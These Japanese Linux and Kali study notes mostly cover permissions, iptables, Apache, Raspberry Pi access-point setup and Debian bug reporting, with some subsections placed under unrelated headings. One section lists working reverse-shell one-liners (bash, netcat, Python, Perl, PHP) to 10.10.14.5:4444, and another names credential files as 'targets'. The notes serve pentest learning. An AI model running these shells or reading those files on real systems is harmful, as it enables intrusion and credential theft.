## 1. ファイルシステム階層 (FHS)

| パス | 内容 |
|---|---|
| `/` | 単一ツリーのルート |
| `/bin` | 必須ユーザーバイナリ |
| `/sbin` | システムバイナリ (root) |
| `/etc` | 設定ファイル |
| `/home` | ユーザーホームディレクトリ |
| `/root` | root のホーム |
| `/tmp` | 一時ファイル (起動時に消去、全ユーザー書き込み可) |
| `/var` | 可変データ (ログ、スプール、キャッシュ) |
| `/usr` | ユーザーアプリケーションとライブラリ |
| `/dev` | デバイスファイル |
| `/proc` | カーネル/プロセス仮想FS |
| `/sys` | ハードウェア仮想FS |
| `/opt` | サードパーティアプリケーション |
| `/srv` | サーバーデータ |
| `/mnt`, `/media` | マウントポイント |

**重要なターゲット:**
```bash
/etc/passwd              # ユーザーアカウント
/etc/shadow              # パスワードハッシュ (root のみ)
/etc/ssh/sshd_config     # SSH 設定
/var/log/auth.log        # 認証ログ
/var/log/syslog          # システムログ
/tmp/                    # 書き込み可能、noexec がないことが多い
/home/*/.ssh/id_rsa      # 秘密 SSH 鍵
/root/.bash_history      # root のコマンド履歴
```

## 2. デバイスファイル: ブロック vs キャラクタ

```bash
ls -l /dev/sda /dev/ttyS0
brw-rw---- 1 root disk    8,  0 /dev/sda    # b = ブロック
crw-rw---- 1 root dialout 4, 64 /dev/ttyS0   # c = キャラクタ
```

| 種類 | マーカー | 例 |
|---|---|---|
| ブロック | `b` | ディスク、パーティション (`/dev/sda`, `/dev/sda1`) |
| キャラクタ | `c` | キーボード、マウス、シリアル (`/dev/input/event0`, `/dev/ttyS0`) |

```bash
file /dev/sda1          # ブロックスペシャル
file /dev/snd/seq       # キャラクタスペシャル
dd if=/dev/sda of=/tmp/disk.img bs=4M status=progress   # ディスク抽出
```

### パーミッションモデル
- **u** = 所有者、**g** = グループ、**o** = その他
- **r** = 4、**w** = 2、**x** = 1

| 記号 | 8進数 |
|---|---|
| rwx | 7 |
| rw- | 6 |
| r-x | 5 |
| r-- | 4 |
| -wx | 3 |
| -w- | 2 |
| --x | 1 |
| --- | 0 |

### chmod
```bash
chmod 755 file              # rwxr-xr-x
chmod 644 file              # rw-r--r--
chmod 600 file              # rw-------
chmod +x file
chmod u+x file
chmod g-w file
chmod -R 755 dir
chmod 4755 file             # setuid
chmod 2755 file             # setgid
chmod 1777 dir              # スティッキー
```

### chown / chgrp
```bash
chown user file
chown user:group file
chown -R user:group dir
chgrp group file
```

### 特殊ビット
| ビット | 8進数 | ファイルへの効果 | ディレクトリへの効果 |
|---|---|---|---|
| setuid | 4000 | 所有者として実行 | — |
| setgid | 2000 | グループとして実行 | 新規ファイルがディレクトリのグループを継承 |
| スティッキー | 1000 | — | 所有者のみ削除可能 |

```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
ls -ld /tmp                 # drwxrwxrwt ('t' = スティッキー)
```

### umask
```bash
umask                       # 例: 0022
umask 0077                  # 新規ファイル 600、ディレクトリ 700
umask 0022                  # 新規ファイル 644、ディレクトリ 755
```

計算式: `file = 666 - umask`、`dir = 777 - umask`

### ACL
```bash
getfacl file
setfacl -m u:user:rwx file
setfacl -x u:user file
```

### ケイパビリティ
```bash
getcap -r / 2>/dev/null
```

## 10. リバースシェル

```bash

bash -i >& /dev/tcp/10.10.14.5/4444 0>&1

# Netcat
nc -e /bin/bash 10.10.14.5 4444
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.5 4444 > /tmp/f

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Perl
perl -e 'use Socket;$i="10.10.14.5";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# PHP
php -r '$sock=fsockopen("10.10.14.5",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### 優先度 (apt/preferences)
```
Package: *
Pin: release o=Kali
Pin-Priority: 900

Package: *
Pin: release o=Debian
Pin-Priority: -10
```

| 優先度 | 動作 |
|---|---|
| < 0 | インストールしない |
| 0–100 | 他のバージョンがない場合のみ |
| 100–500 | より新しいバージョンがない場合のみ |
| 501–990 | ターゲットに新しいものがない場合のみ |
| 990–1000 | インストール済みが新しくない限りインストール |
| > 1000 | 常にインストール、ダウングレードも |

### バーチャルホスト
```apache
<VirtualHost *:80>
    ServerName www.kali.org
    ServerAlias kali.org
    DocumentRoot /srv/www.kali.org/www
    CustomLog /var/log/apache2/www.kali.org-access.log combined
    ErrorLog /var/log/apache2/www.kali.org-error.log
</VirtualHost>
```

### ディレクトリブロック
```apache
<Directory /var/www>
    Options Includes FollowSymLinks
    AllowOverride All
    DirectoryIndex index.php index.html index.htm
</Directory>
```

| オプション | 効果 |
|---|---|
| ExecCGI | CGI を許可 |
| FollowSymLinks | シンボリックリンクを追跡 |
| SymLinksIfOwnerMatch | 同じ所有者の場合のみ追跡 |
| Includes | サーバーサイドインクルード |
| Indexes | ディレクトリ一覧 |
| MultiViews | コンテンツネゴシエーション |
| None | 全て無効 |
| All | MultiViews 以外を全て有効 |

## 21. ファイアウォール (iptables)

### テーブル
| テーブル | 目的 |
|---|---|
| filter | 許可/拒否/破棄 (デフォルト) |
| nat | アドレス/ポート変換 |
| mangle | パケット変更 |
| raw | 接続追跡前 |

### チェーン (filter)
| チェーン | 処理 |
|---|---|
| INPUT | ファイアウォールへ |
| OUTPUT | ファイアウォールから |
| FORWARD | ファイアウォール通過 |

### アクション
| アクション | 効果 |
|---|---|
| ACCEPT | 許可 |
| REJECT | ICMP で拒否 |
| DROP | 無言で破棄 |
| LOG | ログ (処理継続) |
| SNAT/DNAT | NAT (nat テーブル) |
| MASQUERADE | 特別な SNAT |
| REDIRECT | ローカルポートへリダイレクト |

### コマンド
```bash
iptables -L
iptables -n -L
iptables -n -L --line-numbers
iptables -A INPUT -s IP -j DROP
iptables -A INPUT -p tcp --dport 22 -j ACCEPT
iptables -P INPUT DROP
iptables -F
iptables -D INPUT 2
iptables-save
iptables-restore < file
```

### 実践
```bash
iptables -A INPUT -s 10.0.1.5 -j DROP
iptables -A INPUT -s 31.13.74.0/24 -j DROP

iptables -A INPUT -m state --state NEW -p tcp --dport 22 -j ACCEPT
iptables -A INPUT -m state --state NEW -p tcp --dport 80 -j ACCEPT
iptables -A INPUT -m state --state NEW -p tcp --dport 443 -j ACCEPT

iptables -P INPUT DROP
iptables -A INPUT -i lo -j ACCEPT
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
iptables -A INPUT -m state --state NEW -p tcp --dport 22 -j ACCEPT
```

### 永続化
```
# /etc/network/interfaces
auto eth0
iface eth0 inet dhcp
    pre-up iptables-restore < /usr/local/etc/myconfig.fw
```

### NAT / AP
```bash
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
iptables -A FORWARD -i eth0 -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT
iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
```

## 32. 脆弱性 vs エクスプロイト

| 用語 | 定義 |
|---|---|
| 脆弱性 | CIA を損なう欠陥 |
| エクスプロイト | 脆弱性を悪用するソフトウェア |

**脆弱性クラス:**
| クラス | 説明 |
|---|---|
| ファイルインクルージョン | Web アプリが攻撃者ファイルをインクルード |
| SQL インジェクション | 未サニタイズ入力 → SQL 実行 |
| バッファオーバーフロー | 割り当てバッファを超えて書き込み |
| 競合状態 | タイミング操作 |

## 33. 評価タイプ

| タイプ | 目標 | 開始点 |
|---|---|---|
| 脆弱性評価 | 問題のインベントリ | スキャン |
| コンプライアンステスト | フレームワーク準拠 | 脆弱性スキャン |
| 従来のペネトレーションテスト | 態勢改善 | 目標 |
| アプリケーション評価 | 単一アプリ | ブラック/ホワイトボックス |

**シグネチャ結果:**
| 結果 | 意味 |
|---|---|
| 真陽性 | 脆弱性が存在し、検出された |
| 偽陽性 | 脆弱性なし、フラグ付き |
| 真陰性 | 脆弱性なし、フラグなし |
| 偽陰性 | 脆弱性が存在するが、検出されなかった |

**リスク = 可能性 × 影響**

| 可能性 | 攻撃者 | コントロール |
|---|---|---|
| 高 | 熟練、意欲的 | 不十分 |
| 中 | 意欲的、熟練 | 妨げる可能性 |
| 低 | 未熟/意欲なし | 効果的 |

| 影響 | 結果 |
|---|---|
| 高 | 金銭的損失、任務妨害、負傷、死亡 |
| 中 | 金銭的損失、任務妨害、負傷 |
| 低 | 多少の金銭的損失 |

```bash
wget https://www.offsec.com/kali-linux-arm-images/kali-linux-2020.3-rpi3-nexmon.img.xz
sha256sum kali-linux-2020.3-rpi3-nexmon.img.xz
unxz kali-linux-2020.3-rpi3-nexmon.img.xz
lsblk
sudo dmesg | tail -20
sudo dd if=kali-linux-2020.3-rpi3-nexmon.img of=/dev/sdb bs=1M status=progress
sync

# ブート後
passwd
sudo rm /etc/ssh/ssh_host_*
sudo dpkg-reconfigure openssh-server
```

### ARM Chroot
```bash
sudo apt install qemu qemu-user qemu-user-static
sudo mkdir /mnt/sd
sudo mount /dev/sdc2 /mnt/sd/
sudo mount -t proc none /mnt/sd/proc
sudo mount -t sysfs none /mnt/sd/sys
sudo mount -o bind /dev /mnt/sd/dev
sudo mount -o bind /dev/pts /mnt/sd/dev/pts
sudo cp /usr/bin/qemu-arm-static /mnt/sd/usr/bin
sudo LANG=C chroot /mnt/sd/

# 内部
apt update
apt install mlocate net-tools hostapd dnsmasq
exit

# クリーンアップ
sudo umount /mnt/sd/dev/pts
sudo umount /mnt/sd/dev
sudo umount /mnt/sd/sys
sudo umount /mnt/sd/proc
sudo umount /mnt/sd
```

## 46. ワイヤレスアクセスポイント (hostapd + dnsmasq)

**パッケージ:**
```bash
sudo apt install dnsmasq hostapd dhcpcd5
```

**`/etc/dhcpcd.conf`:**
```
denyinterfaces wlan0
```

**`/etc/network/interfaces`:**
```
allow-hotplug wlan0
iface wlan0 inet static
    address 172.24.1.1
    netmask 255.255.255.0
    network 172.24.1.0
    broadcast 172.24.1.255
```

```bash
sudo service dhcpcd restart
sudo ifdown wlan0; sudo ifup wlan0
```

**`/etc/hostapd/hostapd.conf`:**
```
interface=wlan0
driver=nl80211
ssid=Kali-Pi3
hw_mode=g
channel=6
ieee80211n=1
wmm_enabled=1
ht_capab=[HT40][SHORT-GI-20][DSSS_CCK-40]
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_passphrase=raspberrytoor
rsn_pairwise=CCMP
```

```bash
sudo /usr/sbin/hostapd /etc/hostapd/hostapd.conf
```

**`/etc/default/hostapd`:**
```
DAEMON_CONF="/etc/hostapd/hostapd.conf"
```

**`/etc/dnsmasq.conf`:**
```
interface=wlan0
listen-address=172.24.1.1
bind-interfaces
server=8.8.8.8
domain-needed
bogus-priv
dhcp-range=172.24.1.50,172.24.1.150,12h
```

**IP フォワーディング + NAT:**
```bash
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
sudo iptables -A FORWARD -i eth0 -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT
sudo iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT
iptables-save | sudo tee /etc/iptables.ipv4.nat
```

**`/etc/rc.local`:**
```bash
#!/bin/sh -e
iptables-restore < /etc/iptables.ipv4.nat
```

```bash
sudo chmod 711 /etc/rc.local
sudo systemctl start hostapd dnsmasq
sudo systemctl enable hostapd dnsmasq
```

## 48. バグ報告の決定木

```
バグ発見
    │
    ▼
パッケージ所有者を特定 (dpkg -S /path)
    │
    ▼
バージョンに "kali" が含まれるか?
    │
    ├── はい → Kali トラッカーに報告
    │
    └── いいえ → プレーン Debian Testing VM で再現
            │
            ├── 再現する → Debian トラッカーに報告
            │
            └── 再現しない → Kali に報告
```

## 49. バグの重大度 (Debian)

| レベル | 意味 |
|---|---|
| critical | 無関係なソフトウェアを壊す、データ損失、セキュリティホール |
| grave | パッケージが使用不可、データ損失、アカウント侵害 |
| serious | Debian ポリシーの "must" 違反 |
| important | 重大なユーザビリティへの影響 |
| does-not-build | ソースからのビルドに失敗 |
| normal | 特定のオプション/メニュー項目の問題 |
| minor | スペル、見た目 |
| wishlist | 機能リクエスト |
